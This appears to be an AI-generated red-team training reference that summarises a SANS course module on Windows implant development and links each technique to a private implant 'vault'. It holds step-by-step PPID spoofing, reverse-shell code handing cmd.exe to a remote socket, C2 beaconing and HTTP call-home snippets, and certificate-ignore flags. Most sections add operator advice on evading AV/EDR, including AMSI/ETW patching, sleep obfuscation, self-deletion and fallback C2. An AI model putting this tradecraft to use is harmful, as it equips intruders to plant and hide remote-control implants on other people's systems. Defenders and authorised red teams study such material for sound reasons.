---
id: RTO-sec670-evasion-and-c2
name: SEC670 Evasion Techniques & C2 Calling Home
source: SANS SEC670 — Red Teaming Tools: Developing Windows Implants, Shellcode, Command and Control
category: evasion
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T-015, T-016, T-021, T-022, T-023]
tags: [ppid-spoofing, evasion, c2, wininet, winhttp, tls, cert-pinning, aes-gcm, cng, beaconing, reverse-shell, winsock, serialization, alpaca]
---

# SEC670 Evasion Techniques & C2 Calling Home — Training Reference

## TL;DR
This module is split into two halves: (1) a beginner-oriented overview of AV/EDR detection engines (static / dynamic / scan) and a working implementation of **PPID spoofing** via `InitializeProcThreadAttributeList` + `UpdateProcThreadAttribute`; and (2) a ground-up implementation of **C2 "calling home"** primitives — Winsock reverse shells, WinINet vs. WinHTTP HTTP comms, beaconing with jitter, JSON+AES-GCM payload prep, and TLS with cert pinning. For an operator already working with the vault, this material is the *curriculum* underlying T-015 (PPID spoofing) and T-022 (Networking suite). The vault's implementations are substantially more advanced; this training provides the foundational API walk-through and decision logic (e.g., WinINet vs. WinHTTP, jitter rationale, CNG vs. wincrypt) that the vault assumes you already understand.

## Key Concepts

1. **Detection Engine Triad** — AV/EDR products are composed of (a) **static** signature engines (YARA-like rules against on-disk bytes), (b) **dynamic** sandboxed execution in a virtualized container, and (c) **scan** engines (sometimes ML-augmented, e.g., Bitdefender Automatic/Custom). Bypassing static alone is insufficient — the dynamic stage must also be defeated (delaying execution, resource exhaustion, encryption). The vault's anti-analysis suite (T-020) and API hammering directly target the dynamic stage; the vault's crypto suite (T-021) defeats static signature matching.

2. **PPID Spoofing** — Windows exposes a legitimate mechanism to declare the parent PID of a new process via `PROC_THREAD_ATTRIBUTE_LIST` populated with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` *before* `CreateProcess`. The point is operational camouflage: certain ancestry pairs (browser → powershell, office → cmd) are immediate detections, so choose a benign parent (e.g., `explorer.exe`). See **T-015: PPID Spoofing** — the vault implements this directly.

3. **Reverse vs. Bind Shells** — Reverse shells are operationally preferred because outbound SYN is rarely egress-blocked and no listening port is exposed on the target. Implementation requires redirecting `hStdInput`/`hStdOutput`/`hStdError` to a socket via `STARTUPINFOA` + `STARTF_USESTDHANDLES` and calling `CreateProcessA("cmd.exe", ..., bInheritHandles=TRUE)`.

4. **Winsock Initialization** — `WSAStartup(MAKEWORD(2,2), &wsaData)` is mandatory before any `WSASocket` call. Use `WSASocket` (not `socket()`) when you need handle redirection for STD handles; `WSAGetLastError` is the Winsock-specific last-error accessor (not `GetLastError`).

5. **WinINet vs. WinHTTP** — WinINet (`InternetOpen` family) is desktop-oriented, can prompt for credentials (so cannot be used from a service context), and was originally built for IE. WinHTTP (`WinHttpOpen` family) is service-safe, supports impersonation, IPv6, AutoProxy (`WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY`), and is the correct choice for implants running as services. Both return `HINTERNET` handles that thread through the API chain: session → connect → request → send → receive.

6. **Beaconing / Check-in Pattern** — Implants must call home at intervals with **jitter** to avoid fixed-frequency detection. Missed check-ins trigger LP-side compromise suspicion. The canonical loop: `while(alive) { try { response = CheckIn(); CheckTasks(response); } catch(){} sleep(jitter); }`. This pattern is implemented in the vault as `http_poll_transport.rs` (T-022).

7. **Result Exfiltration** — Tasks return results that are JSON-serialized, encrypted (AES-GCM via CNG), encoded, and POSTed to the LP either inline with the next check-in or out-of-band. Thread pools can decouple result prep from beacon cadence.

8. **Network Byte Order (Big Endian)** — Sockets and wire protocols use big endian; x86 Windows is little endian. Use intrinsics `_byteswap_ushort` / `_byteswap_ulong` / `_byteswap_uint64` (preferred over std or library alternatives) or libraries like **alpaca** for struct serialization, and `std::bit_cast` (C++20) for reinterpretation of raw wire data into typed structs.

9. **CNG (Cryptography Next Generation)** — `bcrypt.h` APIs (`BCryptOpenAlgorithmProvider`, `BCryptSetProperty(BCRYPT_CHAIN_MODE_GCM)`, `BCryptGenerateSymmetricKey`, `BCryptEncrypt`/`Decrypt`) are the modern Win32 crypto path; preferred over RC4 stream ciphers and over legacy wincrypt on supported OSes. Use **AES-CTR or AES-GCM**, never ECB/CBC alone. See **T-021: Crypto & Obfuscation** — vault uses AES-256-GCM + zstd pipeline.

10. **TLS + Cert Pinning** — `INTERNET_FLAG_SECURE` enables HTTPS. Self-signed C2 certs require ignoring cert errors via `INTERNET_OPTION_*` flags (`INTERNET_FLAG_IGNORE_CERT_CN_INVALID`, `SECURITY_FLAG_IGNORE_UNKNOWN_CA`, etc.). **Cert pinning** is implemented via `InternetQueryOption(INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT)` → `CertGetNameString` → `CertGetCertificateContextProperty(CERT_HASH_PROP_ID)` → hash comparison. Vault equivalent is in the malleable C2 module (T-022 `henge.rs`).

## Operational Techniques

### PPID Spoofing (Choose Your Parent)
- **What**: Spawn a new process with a parent PID you select rather than the calling process's PID.
- **When to use**: Initial payload execution, lateral movement, second-stage drops — any time the natural parentage (office → powershell, browser → cmd) would trip an ancestry heuristic.
- **How**:
  1. `OpenProcess` the desired parent to obtain `hParent` (PROCESS_CREATE_PROCESS access).
  2. `InitializeProcThreadAttributeList(NULL, 1, 0, &size)` — first call to get buffer size.
  3. `HeapAlloc` a buffer of `size` bytes for `pAttrList`.
  4. `InitializeProcThreadAttributeList(pAttrList, 1, 0, &size)` — real call.
  5. `UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(hParent), NULL, NULL)`.
  6. `STARTUPINFOEX si = {0}; si.lpAttributeList = pAttrList; si.StartupInfo.cb = sizeof(si)`.
  7. `CreateProcessA(..., EXTENDED_STARTUPINFO_PRESENT, ..., &si, &pi)`.
  8. `DeleteProcThreadAttributeList(pAttrList)` + `CloseHandle(hParent)`.
- **Vault link**: **T-015: PPID Spoofing** — vault provides a complete, OPSEC-hardened implementation. This training provides the canonical API sequence that T-015 builds on. Vault additionally handles handle-trust leakage via T-016 BlockHandle, which the training does not address.
- **Tool/code**: `InitializeProcThreadAttributeList`, `UpdateProcThreadAttribute`, `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`, `EXTENDED_STARTUPINFO_PRESENT`, `STARTUPINFOEX`.
- **OPSEC**: 
  - If `hParent` has different integrity level / session ID than the spoofed parent should have, EDRs (Elastic, CrowdStrike) flag this via `PROCESS_CREATE_PROCESS` access log + parent integrity mismatch.
  - Mitigation in vault: T-016 handle blocking prevents EDR from introspecting; T-015 also offers PPID spoofing via `NtCreateUserProcess` (T-014) which doesn't emit the same kernel object-access telemetry.
  - Do **not** drop the sample to disk first — if you do, you risk the static engine quarantining it before you ever execute (training's "lost sample to AV cloud engine" warning).

### Reverse TCP Shell
- **What**: A `cmd.exe` process whose STD handles are wired to a connected TCP socket so the operator has live shell interaction.
- **When to use**: Initial low-overhead interactive access; debug access during capability development.
- **How**:
  1. `WSAStartup(MAKEWORD(2,2), &wsaData)`.
  2. `SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)`.
  3. `sockaddr_in sa = {AF_INET, htons(port), inet_addr(ip)}`.
  4. `if (connect(s, (SOCKADDR*)&sa, sizeof(sa)) != 0) return;`
  5. `STARTUPINFOA si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES; si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;`
  6. `CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)`.
- **Vault link**: No direct card — vault's TCP transport (`tcp_transport.rs` in T-022) implements an implant transport, not an interactive shell. The shell pattern is treated as legacy/educational; the vault's interactive capability is the multi-protocol command FSM in `client_rust/src/commands.rs` (T-023).
- **Tool/code**: `WSAStartup`, `WSASocketA`, `connect`, `CreateProcessA`, `STARTUPINFOA`, `STARTF_USESTDHANDLES`, `bInheritHandles=TRUE`.
- **OPSEC**: `cmd.exe` with redirected STD handles is heavily signatured — ProcessHacker/Sysmon EventID 1 catches the unusual handle table. Modern OPSEC moves to custom shell parsers over the vault's binary protocol (T-022 `protocol.rs`).

### WinINet HTTP C2
- **What**: Use WinINet's `InternetOpen` → `InternetConnect` → `HttpOpenRequest` → `HttpSendRequest` chain to communicate with an HTTP-based C2 LP.
- **When to use**: User-context implant on a workstation where IE components are present; quick-and-dirty C2 with low dev cost; when you want the OS to handle cookie/auth semantics for you.
- **How**:
  ```
  HINTERNET hSess = InternetOpenA("UA", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  HINTERNET hConn = InternetConnectA(hSess, "www.sans.org", 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
  HINTERNET hReq  = HttpOpenRequestA(hConn, "GET", NULL, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
  HttpSendRequestA(hReq, NULL, 0, NULL, 0);
  ```
- **Vault link**: **T-022: Network Suite** — vault uses WinHTTP for staged download (`winhttp_dl.rs`), not WinINet. The training covers both for completeness; the vault standardizes on WinHTTP for service-safety and AutoProxy.
- **Tool/code**: `InternetOpenA`, `InternetConnectA`, `HttpOpenRequestA`, `HttpSendRequestA`, `InternetReadFile`, `InternetCloseHandle`, `INTERNET_FLAG_SECURE`.
- **OPSEC**: WinINet shares cookie store with the user's IE/Edge session — your implant's session cookies can be inspected by the user or by legacy cookie-stealing malware. WinINet also cannot be used from a service.

### WinHTTP HTTP C2 (preferred over WinINet for implants)
- **What**: WinHTTP family for service-safe HTTP communications with AutoProxy support.
- **When to use**: Any implant that may run as a service, in SYSTEM context, or that needs to honor the org's proxy configuration transparently.
- **How**:
  ```
  HINTERNET hSess = WinHttpOpen(L"UA", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  HINTERNET hConn = WinHttpConnect(hSess, L"www.sans.org", 443, 0);
  HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", NULL, NULL, WINHTTP_NO_REFERRER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
  WinHttpReceiveResponse(hReq, NULL);
  ```
- **Vault link**: **T-022: Network Suite** (`winhttp_dl.rs`, `http_poll_transport.rs`). The vault's implementation uses a binary protocol rather than the raw `WinHttpReadData` loop shown here. The API sequence is identical.
- **Tool/code**: `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest`, `WinHttpReceiveResponse`, `WinHttpQueryHeaders`, `WinHttpReadData`, `WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY`, `WINHTTP_FLAG_SECURE`.
- **OPSEC**: WinHTTP still appears in ETW `Microsoft-Windows-WinHTTP` — vault mitigates via T-016 ETW muffling. The User-Agent string passed to `WinHttpOpen` is a free-text IOC; rotate or generate realistic ones.

### Beaconing / Check-in Loop
- **What**: Periodic C2 check-in with jittered timing to receive tasking.
- **When to use**: Always — this is the operational heartbeat of an implant.
- **How**:
  ```cpp
  while (alive) {
    try {
      auto response = CheckIn();        // GET /tasks from LP
      CheckTasks(response);            // parse JSON, dispatch
    } catch (...) {}
    sleep(jitter);                     // base_interval ± delta
  }
  ```
  - Jitter: don't use fixed 30s; use 30s ± random(0–10)s.
  - Track missed check-ins; on N consecutive misses, self-uninstall.
  - Use UUIDs (`UuidCreateSequential`) for task IDs.
- **Vault link**: **T-022: Network Suite** (`http_poll_transport.rs`) — implements long-poll variant; vault's protocol also has a binary command envelope (T-022 `protocol.rs`, 40+ message types).
- **Tool/code**: `UuidCreateSequential`, jitter RNG, JSON parse.
- **OPSEC**: Fixed-frequency beaconing is the single most reliable network IOC; jitter is mandatory. Egress to non-standard ports is itself a detection — stick to 443/80 with TLS.

### Result Serialization & Byte Order
- **What**: Pack task results into a wire-safe byte stream before transmission.
- **When to use**: Any time you send structured data over the wire.
- **How**:
  - Intrinsic endianness swaps (preferred): `_byteswap_ushort` (16), `_byteswap_ulong` (32), `_byteswap_uint64` (64).
  - C++ library: `alpaca` (https://github.com/p-ranav/alpaca/) for struct → `std::vector<BYTE>`.
  - C++20: `std::bit_cast<STUFF>(raw_data)` to rehydrate received structs.
  ```cpp
  typedef struct _STUFF { ULONG IpAddress; std::string HostName; std::string UserName; } STUFF;
  std::vector<BYTE> bv;
  auto n = alpaca::serialize(STUFF, bv);
  ```
- **Vault link**: **T-022: Network Suite** (`protocol.rs`) — vault uses a hand-rolled binary protocol with explicit length-prefixed fields rather than alpaca; both approaches are valid. The endianness guidance is foundational.
- **Tool/code**: `_byteswap_*`, `alpaca::serialize`, `std::bit_cast`.
- **OPSEC**: Don't rely on JSON over plaintext — even with TLS, SSL-inspection appliances (F5 BIG-IP, Blue Coat ProxySG) terminate TLS. Always **encrypt the payload** with AES-GCM *inside* the TLS session.

### Payload Encryption (CNG / AES-GCM)
- **What**: Use Windows CNG (bcrypt.h) to AES-GCM encrypt task data before transmission.
- **When to use**: Always for any sensitive payload — never transmit plaintext even inside TLS.
- **How**:
  ```cpp
  BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
  BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
  BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj, cbKeyObj, key, cbKey, 0);
  BCryptEncrypt(hKey, pbPlaintext, cbPlaintext, &authInfo, pbIV, cbIV, pbCipher, cbCipher, &cbResult, 0);
  ```
- **Vault link**: **T-021: Crypto & Obfuscation** (`crypto.rs`) — vault uses AES-256-GCM + zstd compression pipeline. **Supersedes** this training: the vault adds compression (smaller wire footprint → less beacon signal) and uses compile-time string obfuscation for key material.
- **Tool/code**: `BCryptOpenAlgorithmProvider`, `BCryptSetProperty`, `BCRYPT_AES_ALGORITHM`, `BCRYPT_CHAIN_MODE_GCM`, `BCryptGenerateSymmetricKey`, `BCryptEncrypt`, `BCryptDecrypt`.
- **OPSEC**: 
  - **Do not use RC4** (training explicitly warns against stream ciphers).
  - **Do not use ECB or bare CBC** — GCM provides AEAD (authenticity + confidentiality).
  - CNG APIs don't work on legacy systems (pre-Vista); fall back to wincrypt only when necessary.
  - IV/nonce reuse with the same key is catastrophic — generate fresh IV per message.

### TLS with Self-Signed Cert Acceptance
- **What**: Enable HTTPS comms while accepting self-signed or CA-mismatched certs (typical for red-team C2 infra).
- **When to use**: Internal red team redirectors using self-signed certs; pre-cert-deployment testing.
- **How**:
  ```cpp
  HttpOpenRequestA(hConn, "GET", NULL, NULL, NULL, NULL,
                   INTERNET_FLAG_SECURE |
                   INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_WEAK_SIGNATURE |
                   SECURITY_FLAG_IGNORE_REVOCATION, 0);
  ```
  Or via `InternetSetOption(hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))` after request creation.
- **Vault link**: **T-022: Network Suite** — vault's malleable C2 (`henge.rs`) supports profile-driven TLS flag configuration; the underlying flags are the same.
- **Tool/code**: `INTERNET_FLAG_SECURE`, `INTERNET_OPTION_SECURITY_FLAGS`, the `SECURITY_FLAG_IGNORE_*` family.
- **OPSEC**: Accepting unknown CAs is a blue-team detection signal if your C2 cert ever lands in a network capture. Prefer a *legitimate* Let's Encrypt cert on the redirector and only use ignore-flags during dev.

### Certificate Pinning
- **What**: Hard-code the expected server cert thumbprint in the implant and reject any session that presents a different cert.
- **When to use**: Defensive detection of SSL-inspection appliances; high-value targets where MITM is likely.
- **How**:
  ```cpp
  PCCERT_CHAIN_CONTEXT pChain = NULL;
  DWORD cb = sizeof(pChain);
  InternetQueryOptionA(hReq, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, &pChain, &cb);
  
  // Get common name
  CHAR cn[128] = {0};
  CertGetNameStringA(pChain->rgpChain[0]->rgpElement[0]->pCertContext,
                     CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, cn, sizeof(cn));
  
  // Get the cert's SHA hash
  BYTE hash[64] = {0}; DWORD hashLen = sizeof(hash);
  CertGetCertificateContextProperty(pChain->rgpChain[0]->rgpElement[0]->pCertContext,
                                    CERT_HASH_PROP_ID, hash, &hashLen);
  
  // Compare hash bytes against expected thumbprint
  // Free when done
  CertFreeCertificateChain(pChain);
  ```
- **Vault link**: **T-022: Network Suite** (`henge.rs` malleable profile) — vault supports pinning as part of profile-driven C2 config; uses the same underlying `InternetQueryOption(INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT)` API. The training's snippet is the canonical reference implementation.
- **Tool/code**: `InternetQueryOption` with `INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT`, `CertGetNameString` (`CERT_NAME_SIMPLE_DISPLAY_TYPE`), `CertGetCertificateContextProperty` (`CERT_HASH_PROP_ID`), `CertFreeCertificateChain`.
- **OPSEC**: If pinning detects a MITM, **don't crash** — silently go to sleep and retry later, or pivot to a backup domain (e.g., the vault's `discovery.rs` Sepolia contract fallback, T-019/T-022). A crashing implant is more suspicious than a quiet one.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `InitializeProcThreadAttributeList` | Allocates attribute list buffer for `CreateProcess` extensions | Two-call pattern (size then real) is universal Win32 idiom |
| `UpdateProcThreadAttribute` | Adds `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` entry | Requires `PROCESS_CREATE_PROCESS` access to parent — kernel-logged |
| `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` | Attribute key for PPID spoofing | T-015 vault core |
| `EXTENDED_STARTUPINFO_PRESENT` | dwCreationFlags value to enable `STARTUPINFOEX` | Required for PPID spoofing |
| `DeleteProcThreadAttributeList` | Free attribute list memory | Pair with `HeapFree` |
| `WSAStartup(MAKEWORD(2,2), &wsaData)` | Init Winsock 2.2 | Pair with `WSACleanup` at teardown |
| `WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)` | Create TCP socket supporting handle inheritance | Preferred over `socket()` for STD redirection |
| `WSAGetLastError` | Winsock last-error | NOT `GetLastError` |
| `STARTF_USESTDHANDLES` + `bInheritHandles=TRUE` | Redirect STD handles to socket | Required for reverse-shell pattern |
| `InternetOpenA` | Initialize WinINet session | Sets User-Agent — rotate or mask |
| `InternetConnectA` | Open HTTP/FTP session to host | Prefer hostname over IP for blend |
| `HttpOpenRequestA` | Build request handle (GET/POST) | Verb must be UPPERCASE |
| `HttpSendRequestA` | Dispatch request | Bool return; use `GetLastError` |
| `InternetReadFile` / `InternetWriteFile` | Stream response/request body | Loop until `*lpdwRead == 0` |
| `WinHttpOpen` | Initialize WinHTTP session | `WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY` for org proxy |
| `WinHttpConnect` | Specify target server | Hostname preferred |
| `WinHttpOpenRequest` | Build request | `WINHTTP_FLAG_SECURE` for TLS |
| `WinHttpSendRequest` | Send | Bool return |
| `WinHttpReceiveResponse` | Read response headers/status | Follow with `WinHttpReadData` |
| `INTERNET_FLAG_SECURE` | Force HTTPS | Combine with ignore-flags for self-signed |
| `INTERNET_OPTION_SECURITY_FLAGS` | Set runtime security flags on request handle | OR together `SECURITY_FLAG_IGNORE_*` |
| `INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT` | Retrieve cert chain for pinning | Returns `PCCERT_CHAIN_CONTEXT` |
| `CertGetNameString` (`CERT_NAME_SIMPLE_DISPLAY_TYPE`) | Extract CN/subject | Use for verification logging |
| `CertGetCertificateContextProperty` (`CERT_HASH_PROP_ID`) | Get cert SHA thumbprint | Compare to expected bytes |
| `CertFreeCertificateChain` | Free cert chain | Mandatory to avoid handle leak |
| `_byteswap_ushort/_ulong/_uint64` | Endianness swap intrinsics | Preferred over library/loop |
| `alpaca` (C++ lib) | Serialize struct → `std::vector<BYTE>` | https://github.com/p-ranav/alpaca/ |
| `std::bit_cast` (C++20) | Type-pun raw wire data into struct | Compile-time safe reinterpret |
| `BCryptOpenAlgorithmProvider` (`BCRYPT_AES_ALGORITHM`) | Init CNG AES provider | Vista+ only |
| `BCryptSetProperty` (`BCRYPT_CHAIN_MODE_GCM`) | Configure GCM mode | Use GCM not ECB/CBC |
| `BCryptGenerateSymmetricKey` | Create AES key from raw bytes | Key material must be obfuscated at rest |
| `BCryptEncrypt` / `BCryptDecrypt` | Perform AEAD encrypt/decrypt | Fresh nonce per message mandatory |
| `UuidCreateSequential` | Generate task UUIDs | Less random but faster than `UuidCreate` |
| `Boost` (C++ lib) | **NOT RECOMMENDED** for implants | Massive binary bloat, signature-laden strings |

## Gaps & Extensions

### Where the vault goes beyond this training
- **PPID spoofing via `NtCreateUserProcess`** (T-014) — entirely absent from SEC670. The training only covers the Win32 `CreateProcess` + `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` path, which emits kernel object-access telemetry that `NtCreateUserProcess` direct syscalls avoid (when combined with T-001 RecycledGate or T-003 VEH Gate).
- **Handle blocking** (T-016 `block_handle.rs`) — the training does not address the OPSEC hole where EDR can still `OpenProcess` your parent to verify the spoofed relationship. The vault actively blocks external handle access.
- **Indirect syscalls** (T-001, T-002, T-003) — SEC670 uses normal `CreateProcessA` / `WinHttp*` lib calls with zero syscall indirection. Every API in the training can be hooked by EDR.
- **Stack spoofing** (T-016 `advanced_stack.rs`) — the training's reverse-shell `CreateProcessA` call has a trivially-detectable call stack originating from implant code; the vault implements multi-frame spoofing.
- **Sleep obfuscation** (T-005 Ekko) — the training's `while(alive) { ... sleep(jitter); }` keeps the implant RX-writable in memory throughout. The vault encrypts its own image during sleep.
- **AMSI/ETW patching** (T-016) — completely unaddressed in SEC670; if your implant loads PowerShell or .NET, AMSI/ETW will trip.
- **Malleable C2 profiles** (T-022 `henge.rs`) — SEC670 uses hardcoded URLs and UAs; the vault supports profile-driven dynamic C2.
- **Multi-chain dead-drop C2** (T-019 Edo Dead Drop) — Google Translate / Ethereum / steganography fallback paths the training doesn't conceptualize.
- **Self-deletion via ADS** (T-020 `self_delete.rs`) — the training mentions "uninstall" but provides no implementation.
- **Anti-VM / API hammering / IAT camouflage** (T-020) — SEC670's dynamic-engineer evasion discussion is theoretical only.
- **Binary protocol with 40+ message types** (T-022 `protocol.rs`) vs SEC670's JSON-POST approach — the vault's approach is far more bandwidth-efficient and less signature-prone than the training's JSON pattern.

### Where this training adds value not in the vault
- **Foundational API walk-throughs** — the vault assumes operator fluency with WinINet/WinHTTP/CNG; this training provides the explicit parameter-by-parameter reference (e.g., exact `WSADATA` init dance, `STARTUPINFOA` STD-handle redirection mechanics, the `InternetQueryOption(INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT)` cert-retrieval recipe).
- **WinINet vs. WinHTTP decision logic** — explicit service-context rationale ("WinINet cannot be used from services because it can prompt for credentials") that the vault doesn't restate.
- **Self-signed cert ignore-flag enumeration** — the full `INTERNET_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WEAK_SIGNATURE | SECURITY_FLAG_IGNORE_REVOCATION` set is documented; the vault's profile uses these but doesn't enumerate.
- **CNG vs. wincrypt legacy rationale** — the vault simply uses CNG; the training explains *why* (legacy system fallback).
- **`alpaca` library reference** — third-party serialization option not used in vault but viable alternative to the hand-rolled binary protocol.
- **`UuidCreateSequential` for task IDs** — the training's specific choice (vs. `UuidCreate`); vault uses internal ID scheme.
- **Boost anti-pattern call-out** — explicit "don't use Boost" guidance with reasoning (binary bloat, string signatures) that is implicit in vault design.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` PPID spoofing | T-015: PPID Spoofing | Vault implements the same API + an alternative via NtCreateUserProcess (T-014) for syscall-level stealth |
| Static vs. dynamic AV engines | T-020: Anti-Analysis Suite, T-021: Crypto & Obfuscation | Vault operationalizes dynamic-evasion (API hammering, IAT camo, anti-VM) and static-evasion (string obfuscation, shellcode encoding) that the training only theorizes |
| Winsock reverse shell | T-022: Network Suite (`tcp_transport.rs`) | Vault uses TCP transport but for binary protocol comms, not interactive `cmd.exe` redirection (treated as legacy) |
| WinINet HTTP C2 | T-022: Network Suite (`http_poll_transport.rs`) | Vault uses WinHTTP not WinINet; documents the same API chain pattern |
| WinHTTP API sequence | T-022: Network Suite (`winhttp_dl.rs`) | Vault implementation mirrors the training's `WinHttpOpen→Connect→OpenRequest→SendRequest→ReceiveResponse` chain |
| Beaconing + jitter loop | T-022: Network Suite (`http_poll_transport.rs`) | Vault uses long-poll variant of the same `while(alive) { checkIn(); sleep(jitter); }` pattern |
| JSON task parsing | T-022: Network Suite (`protocol.rs`) | Vault uses binary protocol instead of JSON; equivalent in function |
| `_byteswap_*` endianness swaps | T-022: Network Suite (`protocol.rs`) | Vault's binary protocol handles endianness internally; training teaches the foundational intrinsics |
| `alpaca` library | (none) | Not used in vault; viable alternative pattern |
| `std::bit_cast` | (none) | Not used in vault; Rust uses `bytemuck` / `zerocopy` equivalents |
| CNG AES-GCM (`BCryptEncrypt`) | T-021: Crypto & Obfuscation (`crypto.rs`) | Vault supersedes with AES-256-GCM + zstd compression pipeline; same crypto primitive, more complete workflow |
| TLS `INTERNET_FLAG_SECURE` | T-022: Network Suite | Vault standardizes on WinHTTP `WINHTTP_FLAG_SECURE` |
| Self-signed cert ignore flags | T-022 (`henge.rs`) | Vault exposes these via malleable profile; same flag set |
| Cert pinning (`INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT`) | T-022 (`henge.rs`) | Vault implements identical pinning recipe as part of profile config |
| `UuidCreateSequential` task IDs | T-023: Client Capabilities (`commands.rs`) | Vault uses internal ID scheme; conceptually equivalent |
| Avoid dropping tools to disk | T-019: Edo Dead Drop, T-022: Multi-chain vault | Vault operationalizes this with autonomous fallback C2 paths and memory-only execution |
| Boost anti-pattern | (none, implicit) | Vault's no-Boost stance is implicit in crate choice; training makes the reasoning explicit |